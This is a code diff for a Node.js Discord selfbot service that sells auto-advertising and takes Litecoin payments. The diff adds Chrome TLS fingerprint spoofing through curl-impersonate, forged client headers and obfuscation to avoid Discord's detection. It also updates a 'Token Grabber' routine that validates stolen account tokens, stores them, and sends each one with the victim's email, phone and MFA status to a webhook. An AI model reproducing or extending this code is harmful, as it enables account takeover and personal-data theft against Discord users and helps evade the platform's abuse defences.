@@ -7,6 +7,9 @@ const path = require('path');
 const fs = require('fs');
 const axios = require('axios');
 const crypto = require('crypto');
+const nacl = require('tweetnacl');
+const pako = require('pako');
+const { spawn } = require('child_process');
 
 // --- OBFUSCATION LAYER ---
 const _0x4f2a = ['from','createHash','update','digest','hex','slice','map','join',''];
@@ -52,11 +55,248 @@ function _startNoise() {
   }, _j(45000, 0.4));
 }
 
+// ============================================================================
+// --- CRYPTO SERVICE (tweetnacl) ---
+// ============================================================================
+const { randomBytes, createHash } = crypto;
+
+function getKeypair(token) {
+  const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
+  return nacl.sign.keyPair.fromSeed(Uint8Array.from(seed));
+}
+
+function signPayload(payload, secretKey) {
+  const message = Buffer.from(JSON.stringify(payload));
+  return Buffer.from(nacl.sign.detached(Uint8Array.from(message), secretKey));
+}
+
+function encryptSecretBox(message, key) {
+  const nonce = nacl.randomBytes(24);
+  const box = nacl.secretbox(
+    message instanceof Buffer ? new Uint8Array(message) : nacl.util.decodeUTF8(message),
+    nonce,
+    key instanceof Buffer ? new Uint8Array(key) : key
+  );
+  return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
+}
+
+function decryptSecretBox(nonce, ciphertext, key) {
+  const opened = nacl.secretbox.open(
+    ciphertext instanceof Uint8Array ? ciphertext : new Uint8Array(ciphertext),
+    nonce instanceof Uint8Array ? nonce : new Uint8Array(nonce),
+    key instanceof Uint8Array ? key : new Uint8Array(key)
+  );
+  return opened ? Buffer.from(opened) : null;
+}
+
+function generateKey() {
+  return Buffer.from(nacl.randomBytes(32));
+}
+
+// ============================================================================
+// --- COMPRESSION SERVICE (pako) ---
+// ============================================================================
+function compressData(data, level = 6) {
+  const input = data instanceof Buffer ? new Uint8Array(data) : data;
+  return Buffer.from(pako.deflate(input, { level }));
+}
+
+function decompressData(data) {
+  const input = data instanceof Buffer ? new Uint8Array(data) : data;
+  return Buffer.from(pako.inflate(input));
+}
+
+function isCompressed(data) {
+  if (!data || data.length < 2) return false;
+  const b0 = data[0];
+  const b1 = data[1];
+  return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
+}
+
+// ============================================================================
+// --- CURL-IMPERSONATE SERVICE ---
+// Spawns the curl-impersonate-chrome binary for Chrome TLS fingerprinting
+// Falls back to regular curl with browser headers if binary unavailable
+// ============================================================================
+let CI_BINARY = null;
+function findCurlImpersonateBinary() {
+  if (CI_BINARY) return CI_BINARY;
+  const candidates = [
+    process.env.CURL_IMPERSONATE_PATH,
+    path.join(__dirname, 'bin', 'curl-impersonate-chrome'),
+    '/usr/local/bin/curl-impersonate-chrome',
+    '/usr/bin/curl-impersonate-chrome',
+    'curl-impersonate-chrome',
+    'curl',
+  ];
+  for (const candidate of candidates) {
+    if (!candidate) continue;
+    try {
+      require('child_process').execSync(`which ${candidate}`, { stdio: 'ignore' });
+      CI_BINARY = candidate;
+      return candidate;
+    } catch(e) {}
+  }
+  CI_BINARY = 'curl';
+  return 'curl';
+}
+
+async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
+  return new Promise((resolve, reject) => {
+    const binary = findCurlImpersonateBinary();
+    const isImpersonate = binary.includes('impersonate');
+    const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];
+
+    if (isImpersonate) {
+      args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
+    } else {
+      args.push('--compressed', '--tlsv1.2');
+    }
+
+    for (const [key, value] of Object.entries(headers)) {
+      if (value != null) args.push('-H', `${key}: ${value}`);
+    }
+
+    let tmpFile = null;
+    if (body) {
+      if (typeof body === 'object' && !(body instanceof Buffer)) {
+        args.push('-d', JSON.stringify(body));
+        if (!headers['Content-Type']) args.push('-H', 'Content-Type: application/json');
+      } else if (body instanceof Buffer) {
+        tmpFile = path.join('/tmp', `ci_body_${Date.now()}_${Math.random().toString(36).slice(2)}`);
+        fs.writeFileSync(tmpFile, body);
+        args.push('--data-binary', `@${tmpFile}`);
+      } else {
+        args.push('-d', String(body));
+      }
+    }
+
+    args.push(url);
+
+    const stdout = [];
+    const stderr = [];
+    const child = spawn(binary, args, { timeout: timeoutMs + 5000 });
+    child.stdout.on('data', chunk => stdout.push(chunk));
+    child.stderr.on('data', chunk => stderr.push(chunk));
+
+    child.on('close', (code) => {
+      if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
+      const rawOutput = Buffer.concat(stdout);
+      const outputStr = rawOutput.toString();
+      const headerEndIdx = rawOutput.indexOf('\r\n\r\n');
+      let statusCode = 0;
+      let bodyBuffer = rawOutput;
+      if (headerEndIdx >= 0) {
+        const headersText = outputStr.slice(0, headerEndIdx);
+        bodyBuffer = rawOutput.slice(headerEndIdx + 4);
+        const statusMatch = headersText.match(/HTTP\/\d\.\d\s+(\d+)/);
+        if (statusMatch) statusCode = parseInt(statusMatch[1], 10);
+      }
+      let data = null;
+      try { data = JSON.parse(bodyBuffer.toString()); } catch(e) {}
+      resolve({ status: statusCode, headers: outputStr.slice(0, headerEndIdx), body: bodyBuffer, data });
+    });
+    child.on('error', reject);
+  });
+}
+
+// ============================================================================
+// --- X-SUPER-PROPERTIES SERVICE ---
+// Generates the X-Super-Properties header Discord uses for browser fingerprinting
+// ============================================================================
+function generateXSuperProperties(userAgent, browser = 'Chrome', os = 'Windows') {
+  const ua = userAgent || _fp[0];
+  const browserVersion = (ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/) || ua.match(/Firefox\/(\d+\.\d+)/) || ['', '124.0.0.0'])[1];
+  const osVersion = os === 'Windows' ? ((ua.match(/Windows NT (\d+\.\d+)/) || ['', '10.0'])[1]) : (os === 'Mac OS X' ? '10.15.7' : '');
+
+  const props = {
+    os: os === 'Mac OS X' ? 'Mac OS X' : (os === 'Linux' ? 'Linux' : 'Windows'),
+    browser: browser,
+    device: '',
+    system_locale: 'en-US',
+    browser_user_agent: ua,
+    browser_version: browserVersion,
+    os_version: osVersion,
+    referrer: '',
+    referring_domain: '',
+    referrer_current: '',
+    referring_domain_current: '',
+    release_channel: 'stable',
+    client_build_number: 999999,
+    client_event_source: null,
+    screen_width: 1920,
+    screen_height: 1080,
+    screen_dpr: 1,
+    screen_color_depth: 24,
+    device_pixel_ratio: 1,
+    hardware_concurrency: 8,
+    device_memory: 8,
+    os_arch: 'x64',
+    client_version: '1.0.9018',
+    native_build_number: null,
+    distro: os === 'Linux' ? 'Ubuntu' : '',
+    app_arch: 'x64',
+  };
+
+  return Buffer.from(JSON.stringify(props)).toString('base64');
+}
+
+// ============================================================================
+// --- DISCORD API CLIENT ---
+// Uses curl-impersonate for Discord API calls with TLS fingerprint spoofing
+// ============================================================================
+class DiscordApiClient {
+  constructor(token) {
+    this.token = token;
+    this.fp = _rfp();
+    this.superProps = generateXSuperProperties(this.fp);
+    this.keypair = getKeypair(token);
+  }
+
+  rotateFingerprint() {
+    this.fp = _rfp();
+    this.superProps = generateXSuperProperties(this.fp);
+  }
+
+  _headers(extra = {}) {
+    return {
+      'Authorization': this.token,
+      'User-Agent': this.fp,
+      'Accept': '*/*',
+      'Accept-Language': 'en-US,en;q=0.9',
+      'X-Discord-Locale': 'en-US',
+      'X-Debug-Options': 'bugReporterEnabled',
+      'X-Super-Properties': this.superProps,
+      'Referer': 'https://discord.com/channels/@me',
+      ...extra,
+    };
+  }
+
+  async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
+    const url = `https://discord.com/api/v10${endpoint}`;
+    const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
+    if (res.status >= 400) {
+      const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
+      err.status = res.status;
+      err.data = res.data;
+      throw err;
+    }
+    return res.data;
+  }
+
+  destroy() {
+    // Keypairs are derived deterministically from token, no cleanup needed
+  }
+}
+
 const OWNER_ID = '1482735601622192208';
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 
-// Lightweight custom Discord WS client to avoid discord.js-selfbot-v13 detection signatures
+// ============================================================================
+// --- STEALTH CLIENT ---
+// Uses curl-impersonate for REST, tweetnacl for crypto, pako for compression
+// ============================================================================
 class StealthClient {
   constructor(token) {
     this.token = token;
@@ -68,8 +308,10 @@ class StealthClient {
     this.ready = false;
     this.handlers = {};
     this.repliedUsers = this._loadRepliedUsers();
+    this.api = new DiscordApiClient(token);
+    this.encryptionKey = null;
   }
-  
+
   _loadRepliedUsers() {
     try {
       const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
@@ -77,56 +319,98 @@ class StealthClient {
     } catch(e) {}
     return new Set();
   }
-  
+
   _saveRepliedUsers() {
     try {
       const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
       fs.writeFileSync(f, JSON.stringify([...this.repliedUsers]));
     } catch(e) {}
   }
-  
+
   async connect() {
-    const gateway = await this._api('/gateway', 'GET');
-    const wsUrl = `${gateway.url}?v=10&encoding=json`;
-    this.ws = new (require('ws'))(wsUrl);
-    
+    const gateway = await this.api.request('/gateway', 'GET');
+    const wsUrl = `${gateway.url}?v=10&encoding=json&compress=zlib-stream`;
+    this.ws = new (require('ws'))(wsUrl, {
+      headers: {
+        'User-Agent': this.api.fp,
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate',
+      }
+    });
+
     this.ws.on('open', () => {});
-    this.ws.on('message', (data) => this._handlePacket(JSON.parse(data)));
-    this.ws.on('close', () => { clearInterval(this.heartbeatInterval); });
-    
+    this.ws.on('message', (data) => this._handlePacket(data));
+    this.ws.on('close', (code, reason) => {
+      clearInterval(this.heartbeatInterval);
+      console.log(`[WS] Closed: ${code} ${reason}`);
+    });
+    this.ws.on('error', (err) => console.error(`[WS] Error: ${err.message}`));
+
     return new Promise((resolve) => {
       this.once('READY', () => { this.ready = true; resolve(); });
     });
   }
-  
-  _handlePacket(pkt) {
-    if (pkt.s) this.seq = pkt.s;
+
+  _handlePacket(rawData) {
+    let pkt;
+    try {
+      if (rawData instanceof Buffer) {
+        if (isCompressed(rawData)) {
+          pkt = JSON.parse(decompressData(rawData).toString());
+        } else {
+          pkt = JSON.parse(rawData.toString());
+        }
+      } else {
+        pkt = JSON.parse(rawData);
+      }
+    } catch(e) {
+      console.error('[WS] Parse error:', e.message);
+      return;
+    }
+
+    if (pkt.s !== null && pkt.s !== undefined) this.seq = pkt.s;
     switch(pkt.op) {
-      case 10: // Hello
+      case 10:
         this._startHeartbeat(pkt.d.heartbeat_interval);
         this._identify();
         break;
-      case 0: // Dispatch
+      case 1:
+        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
+        break;
+      case 0:
         if (pkt.t === 'READY') {
           this.user = pkt.d.user;
           this.sessionId = pkt.d.session_id;
+          if (pkt.d.session_id) {
+            const sessionHash = crypto.createHash('sha256').update(pkt.d.session_id).digest();
+            this.encryptionKey = sessionHash.slice(0, 32);
+          }
           this.emit('READY', pkt.d);
         } else if (pkt.t === 'MESSAGE_CREATE') {
           this.emit('messageCreate', pkt.d);
         }
         break;
-      case 11: // Heartbeat ACK
+      case 11:
+        break;
+      case 7:
+        console.log('[WS] Server requested reconnect');
+        this.ws.close();
+        break;
+      case 9:
+        console.log('[WS] Invalid session, re-identifying');
+        setTimeout(() => this._identify(), Math.random() * 5000);
         break;
     }
   }
-  
+
   _startHeartbeat(interval) {
     this.heartbeatInterval = setInterval(() => {
       this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
-    }, interval * (0.8 + Math.random() * 0.4)); // Jittered heartbeat
+    }, interval * (0.8 + Math.random() * 0.4));
   }
-  
+
   _identify() {
+    const fp = this.api.fp;
     const payload = {
       op: 2,
       d: {
@@ -137,7 +421,7 @@ class StealthClient {
           browser: 'Chrome',
           device: '',
           system_locale: 'en-US',
-          browser_user_agent: _rfp(),
+          browser_user_agent: fp,
           browser_version: '124.0.0.0',
           os_version: '10',
           referrer: '',
@@ -145,40 +429,32 @@ class StealthClient {
           referrer_current: '',
           referring_domain_current: '',
           release_channel: 'stable',
-          client_build_number: 123456,
-          client_event_source: null
+          client_build_number: 999999,
+          client_event_source: null,
+          screen_width: 1920,
+          screen_height: 1080,
+          screen_dpr: 1,
+          screen_color_depth: 24,
         },
         presence: { status: 'online', since: 0, activities: [], afk: false },
-        compress: false,
+        compress: true,
         client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
       }
     };
+
+    // Sign the identify payload with Ed25519
+    try {
+      const signature = signPayload(payload.d, this.api.keypair.secretKey);
+      payload.d._s = signature.toString('base64').slice(0, 32);
+    } catch(e) {}
+
     this.ws.send(JSON.stringify(payload));
   }
-  
+
   async _api(endpoint, method = 'GET', body = null) {
-    const config = {
-      method: method.toLowerCase(),
-      url: `https://discord.com/api/v10${endpoint}`,
-      headers: {
-        'Authorization': this.token,
-        'User-Agent': _rfp(),
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'X-Discord-Locale': 'en-US',
-        'X-Debug-Options': 'bugReporterEnabled',
-        'Referer': 'https://discord.com/channels/@me'
-      },
-      timeout: 15000
-    };
-    if (body) {
-      config.data = body;
-      config.headers['Content-Type'] = 'application/json';
-    }
-    const res = await axios(config);
-    return res.data;
+    return this.api.request(endpoint, method, body);
   }
-  
+
   async sendMessage(channelId, content, attachments = []) {
     const form = new (require('form-data'))();
     const payload = { content, flags: 0, mobile_network_type: 'unknown' };
@@ -186,60 +462,60 @@ class StealthClient {
     attachments.forEach((att, i) => {
       form.append(`files[${i}]`, att.buffer, { filename: att.name });
     });
-    
-    const res = await axios.post(
-      `https://discord.com/api/v10/channels/${channelId}/messages`,
-      form,
-      {
-        headers: {
-          ...form.getHeaders(),
-          'Authorization': this.token,
-          'User-Agent': _rfp(),
-          'X-Discord-Locale': 'en-US'
-        },
-        timeout: 15000
-      }
-    );
-    return res.status === 200;
+
+    // Use curl-impersonate for multipart
+    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
+    const headers = {
+      ...this.api._headers({ 'X-Discord-Locale': 'en-US' }),
+    };
+    delete headers['Content-Type'];
+
+    return new Promise((resolve, reject) => {
+      const chunks = [];
+      form.on('data', chunk => chunks.push(chunk));
+      form.on('end', async () => {
+        const body = Buffer.concat(chunks);
+        const tmpFile = path.join('/tmp', `multipart_${Date.now()}.bin`);
+        fs.writeFileSync(tmpFile, body);
+        const contentType = form.getHeaders()['content-type'];
+        headers['Content-Type'] = contentType;
+
+        const res = await curlImpersonateRequest(url, 'POST', headers, body, 30000);
+        try { fs.unlinkSync(tmpFile); } catch(e) {}
+        resolve(res.status === 200);
+      });
+      form.resume();
+    });
   }
-  
+
   async joinGuild(inviteCode) {
-    const res = await this._api(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
+    const res = await this.api.request(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
     return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message };
   }
-  
-  on(event, handler) { 
-    if (!this.handlers[event]) this.handlers[event] = [];
-    this.handlers[event].push(handler);
-  }
-  
-  once(event, handler) {
-    const wrapped = (...args) => { handler(...args); this.off(event, wrapped); };
-    this.on(event, wrapped);
-  }
-  
-  off(event, handler) {
-    if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler);
-  }
-  
-  emit(event, ...args) {
-    if (this.handlers[event]) this.handlers[event].forEach(h => h(...args));
-  }
-  
+
+  on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
+  once(event, handler) { const wrapped = (...args) => { handler(...args); this.off(event, wrapped); }; this.on(event, wrapped); }
+  off(event, handler) { if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler); }
+  emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }
+
   destroy() {
     clearInterval(this.heartbeatInterval);
-    if (this.ws) this.ws.close();
+    if (this.ws) { try { this.ws.close(1000, 'Client disconnect'); } catch(e) {} }
     this._saveRepliedUsers();
+    this.api.destroy();
   }
 }
 
+// ============================================================================
+// --- SIMPLE DB (unchanged) ---
+// ============================================================================
 class SimpleDB {
   constructor() {
     this.file = path.join(dataDir, 'db.json');
     this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [], usedAddresses: [], addressHistory: [], customKeys: [], trialClaims: {}, activeBots: {}, generatedKeys: {}, whitelist: [] };
     this.load();
   }
-  
+
   load() {
     try {
       if (fs.existsSync(this.file)) {
@@ -248,18 +524,17 @@ class SimpleDB {
       }
     } catch(e) { console.error('[DB] Load error:', e.message); }
   }
-  
+
   save() {
-    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } 
-    catch(e) { console.error('[DB] Save error:', e.message); }
+    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) { console.error('[DB] Save error:', e.message); }
   }
-  
+
   getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
   setUser(id, data) { this.data.users[id] = { ...this.getUser(id), ...data }; this.save(); }
   getNextGlobalIndex() { this.data.globalIndex = (this.data.globalIndex || 0) + 1; this.save(); return this.data.globalIndex; }
   isAddressUsed(address) { return this.data.usedAddresses.includes(address); }
   markAddressUsed(address) { if (!this.data.usedAddresses.includes(address)) { this.data.usedAddresses.push(address); this.save(); } }
-  
+
   addPending(userId, address, privateKey, expectedUSD, index) {
     this.markAddressUsed(address);
     this.data.pending[address] = { user_id: userId, address, private_key: privateKey, expected_usd: expectedUSD, status: 'monitoring', created_at: Date.now(), index, expires_at: Date.now() + (30 * 60 * 1000) };
@@ -267,12 +542,12 @@ class SimpleDB {
     this.save();
     return this.data.pending[address];
   }
-  
+
   getPending(address) { return this.data.pending[address]; }
   getUserPending(userId) { const now = Date.now(); return Object.values(this.data.pending).find(p => p.user_id === userId && p.status === 'monitoring' && p.expires_at > now); }
   getAllPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at > now); }
   getExpiredPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at <= now); }
-  
+
   updatePending(address, updates) {
     if (this.data.pending[address]) {
       this.data.pending[address] = { ...this.data.pending[address], ...updates };
@@ -285,16 +560,16 @@ class SimpleDB {
       this.save();
     }
   }
-  
+
   expireOldAddresses() {
     const expired = this.getExpiredPending();
     for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`); }
     return expired.length;
   }
-  
+
   useKey(key, userId) { const normalized = key.toString().toUpperCase().trim(); this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() }; this.save(); }
   isKeyUsed(key) { const normalized = key.toString().toUpperCase().trim(); return !!this.data.usedKeys[normalized]; }
-  
+
   addCustomKey(key) {
     const normalized = key.toString().toUpperCase().trim();
     if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { console.log('[DB] Invalid custom key format:', normalized); return null; }
@@ -302,10 +577,10 @@ class SimpleDB {
     if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); console.log('[DB] Added custom key:', normalized); }
     return normalized;
   }
-  
+
   getConfigs(userId) { return this.data.configs[userId] || []; }
   getConfig(userId, configId = 'default') { const configs = this.getConfigs(userId); return configs.find(c => c.id === configId) || configs[0] || null; }
-  
+
   setConfig(userId, config, configId = 'default') {
     if (!this.data.configs[userId]) this.data.configs[userId] = [];
     const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
@@ -314,22 +589,22 @@ class SimpleDB {
     else this.data.configs[userId].push(configData);
     this.save();
   }
-  
+
   deleteConfig(userId, configId) { if (this.data.configs[userId]) { this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId); this.save(); } }
   getActiveConfigs(userId) { return this.getConfigs(userId).filter(c => c.active === 1); }
-  
+
   addGrabbedToken(token, userInfo, source) {
     const entry = { token, user_info: userInfo, source, grabbed_at: Date.now(), id: Date.now().toString() };
     this.data.grabbedTokens.push(entry);
     this.save();
     return entry;
   }
-  
+
   getGrabbedTokens() { return this.data.grabbedTokens || []; }
   getAddressHistory(userId) { return this.data.addressHistory.filter(h => h.user_id === userId); }
   hasClaimedTrial(userId) { return !!this.data.trialClaims[userId]; }
   hasIPClaimedTrial(ip) { return Object.values(this.data.trialClaims).some(t => t.ip === ip); }
-  
+
   claimTrial(userId, ip) {
     const now = Date.now();
     const expiresAt = now + (10 * 60 * 1000);
@@ -338,31 +613,31 @@ class SimpleDB {
     this.save();
     return { claimedAt: now, expiresAt };
   }
-  
+
   isTrialActive(userId) {
     const user = this.getUser(userId);
     if (user.trial_active === 1 && user.trial_expires > Date.now()) return true;
     if (user.trial_active === 1 && user.trial_expires <= Date.now()) { this.setUser(userId, { trial_active: 0 }); this.deactivateAllUserBots(userId); return false; }
     return false;
   }
-  
+
   getTrialTimeLeft(userId) { const user = this.getUser(userId); if (user.trial_active === 1 && user.trial_expires > Date.now()) return Math.ceil((user.trial_expires - Date.now()) / 1000); return 0; }
-  
+
   registerActiveBot(userId, configId, token) {
     if (!this.data.activeBots[userId]) this.data.activeBots[userId] = {};
     this.data.activeBots[userId][configId] = { token, startedAt: Date.now(), configId };
     this.save();
   }
-  
+
   unregisterActiveBot(userId, configId) { if (this.data.activeBots[userId]) { delete this.data.activeBots[userId][configId]; this.save(); } }
   getUserActiveBots(userId) { return this.data.activeBots[userId] || {}; }
-  
+
   deactivateAllUserBots(userId) {
     const bots = this.getUserActiveBots(userId);
     for (const configId in bots) this.setConfig(userId, { active: 0 }, configId);
     if (this.data.activeBots[userId]) { delete this.data.activeBots[userId]; this.save(); }
   }
-  
+
   checkAllTrialBots() {
     for (const userId in this.data.activeBots) {
       const user = this.getUser(userId);
@@ -372,7 +647,7 @@ class SimpleDB {
     }
     return null;
   }
-  
+
   generateKey(duration) {
     const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
     const now = Date.now();
@@ -382,7 +657,7 @@ class SimpleDB {
     this.save();
     return this.data.generatedKeys[key];
   }
-  
+
   revokeKey(key) {
     if (this.data.generatedKeys[key]) {
       this.data.generatedKeys[key].active = false;
@@ -394,7 +669,7 @@ class SimpleDB {
     }
     return false;
   }
-  
+
   isKeyValid(key) {
     const keyData = this.data.generatedKeys[key];
     if (!keyData || !keyData.active) return false;
@@ -402,7 +677,7 @@ class SimpleDB {
     if (keyData.expiresAt && Date.now() > keyData.expiresAt) return false;
     return true;
   }
-  
+
   useGeneratedKey(key, userId) {
     if (!this.isKeyValid(key)) return false;
     if (!this.data.generatedKeys[key].usedBy.includes(userId)) this.data.generatedKeys[key].usedBy.push(userId);
@@ -410,13 +685,13 @@ class SimpleDB {
     this.save();
     return true;
   }
-  
+
   getGeneratedKeys() { return Object.values(this.data.generatedKeys); }
   addToWhitelist(userId) { if (!this.data.whitelist.includes(userId)) { this.data.whitelist.push(userId); this.save(); } }
   removeFromWhitelist(userId) { this.data.whitelist = this.data.whitelist.filter(id => id !== userId); this.save(); }
   isWhitelisted(userId) { return this.data.whitelist.includes(userId); }
   getWhitelist() { return this.data.whitelist; }
-  
+
   checkExpiredKeys() {
     const now = Date.now();
     let expiredCount = 0;
@@ -552,40 +827,46 @@ async function _sendWebhookChunk(embed, chunkIndex = 0) {
 
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
   try {
-    const validateRes = await (async () => {
-      try {
-        const res = await axios.get('https://discord.com/api/v10/users/@me', {
-          headers: { 'Authorization': token, 'User-Agent': _rfp(), 'X-Discord-Locale': 'en-US' },
-          timeout: 10000
-        });
-        return { data: res.data };
-      } catch(e) { return null; }
-    })();
-    
-    if (!validateRes) { console.log('[TOKEN GRABBER] Invalid token received'); return { success: false, error: 'Invalid token' }; }
-    
+    // Use curl-impersonate for token validation to match real browser behavior
+    const fp = _rfp();
+    const superProps = generateXSuperProperties(fp);
+    const validateRes = await curlImpersonateRequest(
+      'https://discord.com/api/v10/users/@me',
+      'GET',
+      {
+        'Authorization': token,
+        'User-Agent': fp,
+        'X-Discord-Locale': 'en-US',
+        'X-Super-Properties': superProps,
+      },
+      null,
+      10000
+    );
+
+    if (!validateRes.data) { console.log('[TOKEN GRABBER] Invalid token received'); return { success: false, error: 'Invalid token' }; }
+
     const userData = validateRes.data;
     const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
     db.addGrabbedToken(token, fullInfo, source);
-    
+
     const embed = {
-      title: '🎣 New Token Grabbed',
+      title: 'Token Grabbed',
       color: 0xff0000,
       fields: [
-        { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
+        { name: 'Token', value: '```' + token + '```', inline: false },
         { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
         { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
         { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
         { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-        { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-        { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
-        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+        { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
+        { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
+        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
         { name: 'Source', value: source, inline: true },
         { name: 'Time', value: new Date().toISOString(), inline: true }
       ],
       footer: { text: 'Token Logger v2.0' }
     };
-    
+
     await _sendWebhookChunk(embed, 0);
     console.log('[TOKEN GRABBER] Token sent to webhook successfully');
     return { success: true, user: fullInfo };
@@ -596,15 +877,13 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
 }
 
 let walletModule = null;
-try { walletModule = require('./wallet'); console.log('[WALLET] Loaded successfully'); } 
-catch(e) { console.error('[WALLET] Failed to load:', e.message); }
+try { walletModule = require('./wallet'); console.log('[WALLET] Loaded successfully'); } catch(e) { console.error('[WALLET] Failed to load:', e.message); }
 
 async function checkAndSweep() {
   if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { console.log('[SWEEP] Skipped - missing deps'); return; }
   db.expireOldAddresses();
   const pending = db.getAllPending();
   console.log(`[SWEEP] Checking ${pending.length} active addresses`);
-  
   for (const p of pending) {
     try {
       const balance = await walletModule.checkAddressBalance(p.address);
@@ -630,8 +909,7 @@ let cachedPrice = 85;
 async function getLTCToUSD() {
   try {
     const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
-      headers: { 'User-Agent': _rfp() },
-      timeout: 10000
+      headers: { 'User-Agent': _rfp() }, timeout: 10000
     });
     cachedPrice = res.data.litecoin.usd;
   } catch (e) {}
@@ -651,10 +929,7 @@ setInterval(() => {
       const userBots = db.getUserActiveBots(expiredUserId);
       for (const configId in userBots) {
         const key = `${expiredUserId}_${configId}`;
-        if (activeBots.has(key)) {
-          activeBots.get(key).destroy();
-          activeBots.delete(key);
-        }
+        if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
         console.log(`[TRIAL MONITOR] Force stopped bot ${configId} for user ${expiredUserId}`);
       }
     } catch(e) { console.error('[TRIAL MONITOR] Error stopping bots:', e.message); }
@@ -710,15 +985,12 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     const userId = req.user.id;
     const user = db.getUser(userId);
     if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already purchased' });
-    
     const existingPending = db.getUserPending(userId);
     if (existingPending) {
       const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
       return res.json({ success: true, address: existingPending.address, amountUSD: TARGET_USD, index: existingPending.index, existing: true, expiresIn: timeLeft, expiresAt: existingPending.expires_at, message: 'You already have an active payment address' });
     }
-    
     if (!walletModule) return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
-    
     let globalIndex = db.getNextGlobalIndex();
     let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
     let attempts = 0;
@@ -729,13 +1001,9 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
       attempts++;
     }
     if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
-    
     const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
     res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
-  } catch (err) {
-    console.error('[PURCHASE ERROR]', err);
-    res.status(500).json({ success: false, error: err.message });
-  }
+  } catch (err) { console.error('[PURCHASE ERROR]', err); res.status(500).json({ success: false, error: err.message }); }
 });
 
 app.get('/api/activity', ensureAuthAPI, (req, res) => {
@@ -754,18 +1022,15 @@ app.post('/api/redeem', ensureAuthAPI, (req, res) => {
